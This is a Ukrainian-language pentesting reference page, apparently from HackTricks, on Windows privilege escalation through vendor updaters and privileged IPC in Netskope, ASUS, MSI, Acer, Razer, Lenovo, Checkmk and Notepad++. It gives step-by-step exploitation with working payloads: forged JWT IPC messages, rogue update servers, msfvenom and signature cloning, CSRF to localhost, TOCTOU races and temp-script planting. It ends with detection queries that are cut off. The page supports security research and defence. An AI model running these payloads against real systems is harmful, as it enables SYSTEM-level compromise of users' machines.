# Зловживання корпоративними автооновлювачами та привілейованим IPC (наприклад, Netskope, ASUS і MSI)

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці узагальнено клас ланцюжків локального підвищення привілеїв у Windows, виявлених в агентах для корпоративних кінцевих пристроїв і програмах оновлення, які надають простий у використанні інтерфейс IPC і привілейований механізм оновлення. Показовий приклад — Netskope Client для Windows < R129 (CVE-2025-0309): користувач із низькими привілеями може змусити систему пройти реєстрацію на контрольованому зловмисником сервері, а потім доставити шкідливий MSI, який служба встановить із правами SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ключові ідеї, які можна застосувати до схожих продуктів:
- Зловживайте IPC привілейованої служби через localhost, щоб примусово виконати повторну реєстрацію або переналаштування на сервер зловмисника.
- Реалізуйте endpoints оновлення постачальника, доставте rogue Trusted Root CA і вкажіть програмі оновлення на шкідливий «підписаний» пакет.
- Обходьте слабкі перевірки підписувача (списки дозволених CN), необов’язкові прапорці digest і некоректні властивості MSI.
- Якщо IPC «зашифрований», отримайте ключ/IV із загальнодоступних ідентифікаторів комп’ютера, збережених у реєстрі.
- Якщо служба обмежує викликачів за шляхом до образу або назвою процесу, виконайте ін’єкцію в процес зі списку дозволених або запустіть такий процес призупиненим і завантажте DLL за допомогою мінімальної зміни контексту потоку.

До власних локальних TCP-служб слід застосовувати такий самий аналіз ідентичності та меж введення, навіть якщо для доступу потрібен PIN-код або інші облікові дані програми. Визначте процес, якому належить listener, і фактичний обліковий запис служби, а потім перевірте конкретний розгорнутий бінарний файл/версію та чи перевіряється довжина полів, контрольованих викликачем, перед копіюванням у буфери фіксованого розміру або використанням для побудови команди дочірнього процесу. [Рекомендації Microsoft щодо переповнення буфера](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) пояснюють, чому неперевірене зовнішнє введення небезпечне в привілейованому нативному коді. Listener на loopback, жорстко закріплені облікові дані або сама назва процесу не доводять наявність пошкодження пам’яті чи виконання з правами SYSTEM; доступність, авторизація, шлях виконання коду та засоби пом’якшення ризику — це окремі умови. Під час звичайного переліку уникайте активних дій і не надсилайте запити з довжиною, що може спричинити збій, до запущеної служби.

---
## 1) Примусова реєстрація на сервері зловмисника через localhost IPC

Багато агентів постачають user-mode UI-процес, який взаємодіє зі службою SYSTEM через localhost TCP, використовуючи JSON.

Виявлено в Netskope:
- UI: stAgentUI (низький рівень цілісності) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Сценарій експлуатації:
1) Створіть JWT-токен реєстрації, claims якого дають змогу керувати backend-хостом (наприклад, AddonUrl). Використайте alg=None, щоб не вимагався підпис.
2) Надішліть IPC-повідомлення, яке викликає команду реєстрації, разом із вашим JWT і назвою tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Служба починає звертатися до вашого rogue server для отримання даних enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка виклику базується на шляху/назві, надішліть запит від allow-listed vendor binary (див. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Перехоплення каналу оновлення для запуску коду від імені SYSTEM

Щойно клієнт почне взаємодіяти з вашим сервером, реалізуйте очікувані endpoints і скеруйте його на MSI зловмисника. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON config із дуже коротким інтервалом оновлення, наприклад:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Повертає CA-сертифікат у форматі PEM. Служба встановлює його в сховище Trusted Root локального комп’ютера.
3) /v2/checkupdate → Надає метадані, що вказують на шкідливий MSI та підроблену версію.

Обхід поширених перевірок, які трапляються на практиці:
- Список дозволених CN підписувача: служба може лише перевіряти, чи дорівнює Subject CN значенню “netSkope Inc” або “Netskope, Inc.”. Ваша rogue CA може видати сертифікат leaf із таким CN і підписати MSI.
- Властивість CERT_DIGEST: додайте нешкідливу властивість MSI з назвою CERT_DIGEST. Під час встановлення вона не перевіряється.
- Необов’язкова перевірка digest: прапорець конфігурації (наприклад, check_msi_digest=false) вимикає додаткову криптографічну перевірку.

Результат: служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує довільний код від імені NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Урок обходу патчів: якщо постачальник у відповідь додає до списку дозволених кілька «довірених» доменів замість криптографічної автентифікації джерела оновлень, пошукайте редиректори або reverse proxy, що належать постачальнику й усе ще дають змогу спрямовувати трафік. У випадку Netskope подальше публічне дослідження показало, що список дозволених доменів епохи R129 усе ще можна було обійти через `rproxy.goskope.com`, який проксіював вміст Azure App Service, контрольований атакувальником. Вважайте списки дозволених hostname перешкодою, а не межею довіри.<sup>[[14]](#references)</sup>

---
## 3) Підробка зашифрованих IPC-запитів (якщо є)

Починаючи з R127, Netskope загортав IPC JSON у поле encryptData, схоже на Base64. Реверс-аналіз показав використання AES із ключем/IV, похідними від значень реєстру, доступних будь-якому користувачеві:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Атакувальники можуть відтворити шифрування й надсилати коректні зашифровані команди від імені звичайного користувача.<sup>[[1]](#references)[[2]](#references)</sup> Загальна порада: якщо агент раптом починає «шифрувати» свій IPC, шукайте в HKLM ідентифікатори пристроїв, GUID продукту та ідентифікатори інсталяції, які використовуються як матеріал для ключів.

---
## 4) Обхід списків дозволених викликачів IPC (перевірки шляху/назви)

Деякі служби намагаються автентифікувати peer, визначаючи PID TCP-з’єднання та порівнюючи шлях/назву образу зі списком дозволених бінарних файлів постачальника в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні способи обходу:
- DLL injection у дозволений процес (наприклад, nsdiag.exe) і проксіювання IPC зсередини нього.
- Запустити дозволений бінарний файл у стані призупинення й завантажити свою proxy DLL без CreateRemoteThread (див. §5), щоб задовольнити правила драйвера щодо захисту від втручання.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Ін’єкція, сумісна із захистом від втручання: призупинений процес + патч NtContinue

Продукти часто постачаються з драйвером minifilter/OB callbacks (наприклад, Stadrv), який прибирає небезпечні права з handle до захищених процесів:
- Процес: вилучає PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Потік: обмежує права до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний user-mode loader, що дотримується цих обмежень:
1) Створіть процес із бінарного файлу постачальника за допомогою CREATE_SUSPENDED.
2) Отримайте handle, які й надалі дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для процесу та handle потоку з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо ви змінюєте код за відомим RIP).
3) Перезапишіть ntdll!NtContinue (або інший ранній, гарантовано відображений thunk) невеликим stub, який викликає LoadLibraryW для шляху до вашої DLL, а потім повертається назад.
4) Викличте ResumeThread, щоб запустити ваш stub у процесі й завантажити вашу DLL.

Оскільки ви не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже захищеного процесу (ви його створили), політика драйвера дотримується.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Практичні інструменти
- NachoVPN (плагін Netskope) автоматизує створення rogue CA, підписання шкідливого MSI та обслуговує потрібні endpoint: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope — це спеціалізований IPC-клієнт, який формує довільні IPC-повідомлення (за потреби зашифровані AES) і містить ін’єкцію в призупинений процес, щоб надсилати їх від імені бінарного файлу зі списку дозволених.<sup>[[4]](#references)</sup>

## 7) Швидкий процес первинного аналізу невідомих поверхонь updater/IPC

Під час аналізу нового endpoint-агента або набору допоміжних програм для материнської плати зазвичай достатньо швидкого процесу, щоб зрозуміти, чи є перед вами перспективна ціль для privesc:<sup>[[6]](#references)</sup>

1) Перерахуйте loopback-слухачі та визначте відповідні процеси постачальника:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Перерахуйте потенційні іменовані канали:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Зберіть дані маршрутизації, що зберігаються в реєстрі та використовуються IPC-серверами на основі плагінів:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Спочатку витягніть назви endpoint-ів, ключі JSON і command ID з клієнта в режимі користувача. Упаковані фронтенди Electron/.NET часто leak-ають повну схему:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Шукайте фактичний предикат довіри, а не лише шлях виконання коду, який зрештою запускає процес:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Патерни, яким варто надати пріоритет:
- `CryptQueryObject`/розбір сертифікатів без `WinVerifyTrust` зазвичай означає, що «сертифікат існує» прирівняли до «сертифікат довірений», що уможливлює клонування сертифікатів та інші трюки з підробленими підписувачами.
- Перевірки підрядка/суфікса для `Origin`, `Referer`, URL-адрес завантажень, назв процесів або CN підписувачів — це не автентифікація. `contains(".vendor.com")` зазвичай можна експлуатувати за допомогою схожих доменів, контрольованих атакувальником.
- Якщо GUI з низькими привілеями визначає, що «файл надійний», а брокер SYSTEM лише використовує цей результат, виправлення або повторна реалізація клієнтської DLL/JS часто повністю обходить цей бар’єр (розділена перевірка в стилі Razer).
- Якщо брокер копіює payload у `%TEMP%`/`C:\Windows\Temp`, а потім перевіряє його або планує запуск із цього шляху, негайно перевірте наявність вікон TOCTOU для підміни та сусідніх модулів плагінів, які надають альтернативні обгортки `ExecuteTask()` зі слабшими перевірками.<sup>[[6]](#references)</sup>

Для цілей із великою кількістю named pipe PipeViewer — це швидкий спосіб виявити слабкі DACL і доступні з віддаленого боку канали, перш ніж починати детально реверсити протокол.<sup>[[11]](#references)</sup>

Якщо ціль автентифікує клієнтів лише за PID, шляхом до образу або назвою процесу, вважайте це радше перешкодою, ніж бар’єром: часто достатньо впровадитися в легітимний клієнт або встановити з’єднання з процесу зі списку дозволених, щоб пройти перевірки сервера. Щодо named pipe, [ця сторінка про імперсонацію клієнта та зловживання pipe](named-pipe-client-impersonation.md) докладніше описує цю примітивну техніку.

Для привілейованого **брокера очищення або відновлення** перевірте межу довіри до шляхів, а також ACL каналу. Користувач із нижчими привілеями може мати змогу вибрати місце відновлення або перейменувати проміжний артефакт резервної копії у спільному каталозі, навіть якщо виконуваний файл служби та каталог її інсталяції захищені. Окремо підтвердьте, що користувач може викликати команду відновлення, змінити саме проміжне вхідне дане або ім’я файлу, що брокер працює з вищими привілеями та що операція відновлення справді записує дані у вибраний захищений шлях. Доступний для запису проміжний каталог або доступний для читання канал самі по собі не доводять можливість довільного привілейованого запису; потрібен аналіз коду або контрольоване тестування відображення шляхів і поведінки служби. Не запускайте невідому команду очищення під час пасивної розвідки, оскільки вона може видалити файли користувача.

---
## 8) Модульні брокери add-in, автентифіковані лише підписами виробника (патерн Lenovo Vantage)

Новий варіант, на який варто звернути увагу, — це **RPC-брокер із підписаним клієнтом**: десктопний процес Lenovo, підписаний виробником і запущений із низькими привілеями, взаємодіє зі службою SYSTEM, а служба маршрутизує JSON-команди до набору add-in, описаних у XML, у `%ProgramData%`. Щойно вдається виконати код **усередині будь-якого прийнятого підписаного клієнта**, кожен контракт `runas="system"` стає частиною поверхні атаки.<sup>[[15]](#references)</sup>

Важливі примітиви, виявлені під час досліджень Lenovo Vantage:
- **Довіра до клієнта через підпис виробника**: дослідники отримали автентифікований контекст, скопіювавши підписаний Lenovo EXE у каталог із доступом на запис і задовольнивши умову DLL side-load (`profapi.dll`), завдяки чому довільний код виконався всередині клієнта, якому служба вже довіряла.
- **Виявлення поверхні атаки за маніфестами**: add-in оголошені в `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; кілька контрактів виконуються від імені `SYSTEM`, тож перелік цих маніфестів часто швидше виявляє справжні привілейовані команди, ніж реверс брокера.
- **Помилки окремих команд за автентифікованим каналом**: опинившись усередині довіреного клієнта, дослідники виявили в публічних матеріалах обходи каталогів і race condition у командах оновлення/інсталяції, зловживання raw SQL у привілейованих базах даних налаштувань, а також перевірки шляхів реєстру на основі підрядків, які уможливлювали записи поза межами призначеного hive.

Корисна розвідка цілі:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Практичний висновок: щоразу, коли набір допоміжних утиліт надає брокер, який спочатку автентифікує **процес-викликач**, а лише потім передає керування десяткам команд плагінів/надбудов, не зупиняйтеся після обходу початкової перевірки довіри. Вивантажте таблицю маніфесту/контракту й окремо fuzz кожну команду з високими привілеями; автентифікований канал зазвичай приховує кілька помилок другого етапу.

---
## 1) CSRF із браузера до localhost проти привілейованих HTTP API (ASUS DriverHub)

DriverHub постачає HTTP-службу в режимі користувача (ADU.exe) на 127.0.0.1:53000, яка очікує виклики браузера з https://driverhub.asus.com. Фільтр origin просто виконує `string_contains(".asus.com")` для заголовка Origin і URL завантаження, доступних через `/asus/v1.0/*`. Тому будь-який контрольований зловмисником хост, наприклад `https://driverhub.asus.com.attacker.tld`, проходить перевірку й може надсилати запити, що змінюють стан, із JavaScript.<sup>[[6]](#references)</sup> Додаткові способи обходу див. у матеріалі [основи CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md).

Практичний сценарій:
1) Зареєструйте домен, що містить `.asus.com`, і розмістіть на ньому шкідливу вебсторінку.
2) Використайте `fetch` або XHR, щоб викликати привілейовану кінцеву точку (наприклад, `Reboot` чи `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть тіло JSON, якого очікує обробник, — упакований JS фронтенду показує схему нижче.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Навіть наведений нижче CLI PowerShell виконується успішно, якщо підробити заголовок Origin, указавши довірене значення:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Будь-який перехід у браузері на сайт зловмисника стає локальним CSRF в 1 клік (або в 0 кліків через `onload`), що запускає помічник із правами SYSTEM.

---
## 2) Небезпечна перевірка підпису коду та клонування сертифіката (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні виконувані файли, визначені в JSON-тілі запиту, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Перевірка URL завантаження використовує ту саму логіку пошуку підрядка, тому приймається `http://updates.asus.com.attacker.tld:8000/payload.exe`. Після завантаження ADU.exe лише перевіряє, що PE-файл має підпис і що рядок Subject збігається з ASUS, перш ніж запускати його — без `WinVerifyTrust` і перевірки ланцюжка сертифікатів.

Щоб використати цей механізм:
1) Створіть payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Клонуйте підпис ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістіть `pwn.exe` на схожому домені `.asus.com` і запустіть UpdateApp через описаний вище CSRF у браузері.

Оскільки і фільтри Origin та URL шукають підрядок, а перевірка підписанта лише порівнює рядки, DriverHub завантажує та виконує бінарний файл зловмисника у своєму привілейованому контексті.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU у шляхах копіювання/виконання updater (MSI Center CMD_AutoUpdateSDK)

SYSTEM-сервіс MSI Center надає TCP-протокол, у якому кожен кадр має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основний компонент (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Обробник:
1) Копіює переданий виконуваний файл у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє підпис через `CS_CommonAPI.EX_CA::Verify` (суб’єкт сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` має завершитися успішно).
3) Створює заплановане завдання, яке запускає тимчасовий файл як SYSTEM з аргументами, контрольованими зловмисником.

Скопійований файл не блокується між перевіркою та викликом `ExecuteTask()`. Зловмисник може:
- Надіслати кадр A із легітимним бінарним файлом, підписаним MSI (це гарантує успішне проходження перевірки підпису та постановку завдання в чергу).
- Створити з ним гонку, надсилаючи повторні повідомлення кадру B із шкідливим payload, який перезаписує `MSI Center SDK.exe` одразу після завершення перевірки.

Коли спрацює планувальник, він виконає перезаписаний payload з правами SYSTEM, хоча перевірку пройшов початковий файл. Для надійної експлуатації використовуються дві goroutine/threads, які безперервно надсилають CMD_AutoUpdateSDK, доки не буде виграно TOCTOU-гонку.<sup>[[6]](#references)</sup>

---
## 2) Зловживання власними IPC із рівнем SYSTEM та impersonation (MSI Center + Acer Control Centre)

### Набори TCP-команд MSI Center
- Кожен плагін/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, що зберігається в `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти кадру вибирають цей компонент, що дає зловмисникам змогу спрямовувати команди до довільних модулів.
- Плагіни можуть визначати власні засоби запуску завдань. `Support\API_Support.dll` надає `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і безпосередньо викликає `API_Support.EX_Task::ExecuteTask()` **без перевірки підпису** — будь-який локальний користувач може вказати на `C:\Users\<user>\Desktop\payload.exe` і гарантовано отримати виконання з правами SYSTEM.
- Перехоплення loopback-трафіку за допомогою Wireshark або інструментування .NET-бінарних файлів у dnSpy швидко виявляє відповідність Component ↔ command; після цього власні клієнти на Go/Python можуть повторно надсилати кадри.<sup>[[6]](#references)</sup>

### Іменовані канали Acer Control Centre та рівні impersonation
- `ACCSvc.exe` (SYSTEM) надає `\\.\pipe\treadstone_service_LightMode`, а його дискреційний ACL дозволяє віддаленим клієнтам підключатися (наприклад, через `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання command ID `7` із шляхом до файлу викликає процедуру запуску процесу в сервісі.
- Клієнтська бібліотека серіалізує магічний байт-термінатор (113) разом з аргументами. Динамічне інструментування за допомогою Frida/`TsDotNetLib` (поради з інструментування див. у [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) показує, що нативний обробник зіставляє це значення з `SECURITY_IMPERSONATION_LEVEL` та SID цілісності перед викликом `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) переводить виконання до загальної гілки, яка зберігає повний токен SYSTEM і встановлює SID високого рівня цілісності (`S-1-16-12288`). Тому запущений бінарний файл працює як SYSTEM без обмежень — як локально, так і на іншій машині.
- Поєднайте це з доступним прапорцем інсталятора (`Setup.exe -nocheck`), щоб розгорнути ACC навіть на лабораторних VM і перевірити канал без обладнання виробника.<sup>[[6]](#references)</sup>

Ці помилки IPC показують, чому локальні сервіси мають забезпечувати взаємну автентифікацію (ALPC SIDs, фільтри `ImpersonationLevel=Impersonation`, фільтрацію токенів), а також чому засоби кожного модуля для «запуску довільного бінарного файлу» мають використовувати однакові перевірки підписанта.

---
## 3) COM/IPC-помічники «elevator» із ненадійною перевіркою в user-mode (Razer Synapse 4)

У Razer Synapse 4 з’явився ще один корисний приклад із цієї категорії: користувач із низькими привілеями може попросити COM-помічник запустити процес через `RzUtility.Elevator`, тоді як рішення про довіру делеговане user-mode DLL (`simple_service.dll`), а не надійно забезпечене в привілейованому контексті.

Спостережений шлях експлуатації:
- Створіть екземпляр COM-об’єкта `RzUtility.Elevator`.
- Викличте `LaunchProcessNoWait(<path>, "", 1)`, щоб запросити запуск із підвищеними привілеями.
- У загальнодоступному PoC перевірку PE-підпису в `simple_service.dll` вимкнено до надсилання запиту, що дозволяє запустити довільний виконуваний файл, вибраний зловмисником.<sup>[[6]](#references)[[10]](#references)</sup>

Мінімальний виклик PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Загальний висновок: під час реверсингу «допоміжних» наборів програм не обмежуйтеся localhost TCP або named pipes. Перевірте наявність COM-класів із назвами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім з’ясуйте, чи привілейована служба сама перевіряє цільовий бінарний файл, чи просто довіряє результату, обчисленому DLL клієнта в user mode, яку можна пропатчити. Ця схема трапляється не лише в Razer: будь-яка розділена архітектура, у якій брокер із високими привілеями отримує рішення allow/deny від компонента з низькими привілеями, може стати поверхнею для privesc.


---
## Виконання передбачуваного тимчасового скрипту під час відновлення MSI (Checkmk Agent / CVE-2024-0670)

Деякі агенти Windows досі реалізують привілейовані дії, записуючи тимчасовий `.cmd` у `C:\Windows\Temp` і виконуючи його від імені `SYSTEM`. Якщо ім’я файлу передбачуване, а служба ненадійно обробляє вже наявні файли, користувач із низькими привілеями може заздалегідь створити майбутній тимчасовий файл лише для читання та змусити привілейований процес виконати вміст, контрольований зловмисником, замість власного скрипту.

Спостерігалося у вразливих збірках Checkmk Agent:
- шаблон тимчасового файлу: `cmk_all_<PID>_1.cmd`
- вразливі гілки: `2.0.0`, `2.1.0`, `2.2.0`
- тригер: **відновлення** MSI-кешованого пакета агента<sup>[[8]](#references)[[9]](#references)</sup>

Практичний порядок дій:
1. Оцініть реалістичний діапазон PID за поточними ідентифікаторами процесів або PID запущеного агента.
2. Запишіть короткий корисний `.cmd`-файл у **ASCII** (`Set-Content -Encoding Ascii` або перенаправлення в `cmd.exe`; не використовуйте вивід PowerShell у UTF-16 для batch-файлів).
3. Створіть файли `C:\Windows\Temp\cmk_all_<PID>_1.cmd` для всіх значень у вибраному діапазоні та позначте кожен файл як доступний лише для читання.
4. Запустіть відновлення кешованого MSI, щоб привілейована служба спробувала відтворити тимчасовий скрипт, а потім виконала його.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Якщо вразливий продукт встановлено за допомогою Windows Installer, зіставте кешований MSI-файл із випадковою назвою в `C:\Windows\Installer` з назвою продукту, перш ніж запускати відновлення:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta` корисна, коли `msiexec /fa` завершується помилкою з неінтерактивної оболонки WinRM і потрібно з’ясувати, чи наявний від’єднаний сеанс робочого столу може правильно запустити відновлення.<sup>[[7]](#references)</sup>
- Цей шаблон застосовний і до інших endpoint-агентів та програм оновлення, які **розміщують тимчасові скрипти в каталогах із правом запису для всіх, а згодом виконують їх від імені SYSTEM**. Перевіряйте передбачувані імена, відсутність семантики ексклюзивного створення та можливість запускати процеси відновлення/оновлення на вимогу.

### Відновлення інтерактивного інсталятора та привілейована консоль

PDF24 Creator 11.15.1 демонструє окремий ризик відновлення MSI: під час відновлення спеціальна дія встановлення принтера може запустити видиму консоль із правами SYSTEM. Постачальник змінив інсталятор MSI у версії 11.15.2, щоб усунути цю поведінку. Стара версія продукту — лише підказка для первинної перевірки. З’ясуйте, чи зареєстрований або доступний пакет MSI, чи може цей користувач ініціювати відновлення, чи наявні вразлива спеціальна дія та затримка через файл журналу, а також чи може інтерактивний робочий стіл показати консоль. Для створення затримки, про яку повідомлялося, використовували oplock на `faxPrnInst.log`; звичайного права на запис у файл недостатньо. Неінтерактивна оболонка, недоступний пакет або виправлений інсталятор можуть перервати ланцюжок. Ця проблема не залежить від `AlwaysInstallElevated` і відрізняється від підміни передбачуваного тимчасового скрипту.

---
## Віддалене захоплення ланцюжка постачання через слабку перевірку програмою оновлення (WinGUp / Notepad++)

У період із червня 2025 року до грудня 2025 року зловмисники, які скомпрометували хостингову інфраструктуру, що підтримувала процес оновлення Notepad++, вибірково надсилали шкідливі маніфести окремим жертвам. Старі програми оновлення на базі WinGUp не повністю перевіряли справжність оновлень, тому шкідлива відповідь XML могла перенаправляти клієнтів на URL-адреси зловмисників. Оскільки клієнт приймав вміст HTTPS, не перевіряючи одночасно надійний ланцюжок сертифікатів і дійсний PE-підпис завантаженого інсталятора, жертви завантажували та виконували троянізований `update.exe` на базі NSIS.<sup>[[12]](#references)[[13]](#references)</sup>

Операційний процес (локальний експлойт не потрібен):
1. **Перехоплення інфраструктури**: скомпрометувати CDN/хостинг і відповідати на запити оновлення метаданими зловмисника, що вказують на шкідливу URL-адресу завантаження.
2. **Троянізований NSIS**: інсталятор завантажує/виконує payload і зловживає двома ланцюжками виконання:
   - **Bring-your-own signed binary + sideload**: долучити підписаний файл Bitdefender `BluetoothService.exe` і розмістити шкідливий `log.dll` у каталозі пошуку. Коли запускається підписаний файл, Windows завантажує `log.dll` через sideload; бібліотека розшифровує та рефлексивно завантажує бекдор Chrysalis (захищений Warbird і використовує хешування API, щоб ускладнити статичне виявлення).
   - **Ін’єкція shellcode через скрипт**: NSIS виконує скомпільований Lua-скрипт, який використовує Win32 API (наприклад, `EnumWindowStationsW`) для ін’єкції shellcode та розгортання Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Рекомендації щодо посилення захисту/виявлення для будь-якої програми оновлення:
- Вимагайте **перевірки сертифіката й підпису** завантаженого інсталятора (закріплюйте сертифікат підписувача постачальника, відхиляйте невідповідний CN/ланцюжок) і підписуйте сам маніфест оновлення (наприклад, за допомогою XMLDSig). Блокуйте перенаправлення, задані в маніфесті, якщо їх не перевірено.
- Розглядайте **BYO signed binary sideloading** як напрямок виявлення після завантаження: сповіщайте, коли підписаний EXE постачальника завантажує DLL із каталогу поза канонічним шляхом інсталяції (наприклад, Bitdefender завантажує `log.dll` із Temp/Downloads), а також коли програма оновлення розміщує/виконує інсталятори з тимчасового каталогу, підписи яких не належать постачальнику.
- Відстежуйте **артефакти, специфічні для malware**, виявлені в цьому ланцюжку (корисні як загальні точки пошуку): mutex `Global\Jdhfv_1.0.1`, аномальний запис `gup.exe` у `%TEMP%` і етапи ін’єкції shellcode через Lua.
- Notepad++ посилив WinGUp у версії v8.8.9 та пізніших: XML-відповідь тепер підписується (XMLDSig), а новіші збірки перевіряють сертифікат і підпис завантаженого інсталятора, а не покладаються лише на транспортний рівень.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading підписаного Bitdefender EXE бібліотеки <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запускає інсталятор, який не є інсталятором Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
